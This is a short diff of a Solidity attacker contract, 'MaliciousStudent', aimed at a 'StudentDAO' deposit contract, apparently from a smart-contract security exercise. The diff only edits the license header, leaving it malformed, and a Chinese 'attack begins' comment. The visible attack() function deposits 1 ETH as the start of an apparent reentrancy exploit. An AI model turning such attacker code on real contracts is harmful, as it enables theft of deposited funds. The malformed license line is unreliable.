@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier
 pragma solidity ^0.8.0;
 
 interface IStudentDAO {
@@ -15,7 +15,7 @@ contract MaliciousStudent {
         owner = msg.sender;
     }
 
-    // 攻擊開始！
+    // 攻擊開始
     function attack() public payable {
         require(msg.value >= 1 ether, "Need 1 ETH to attack");
         dao.deposit{value: 1 ether}();
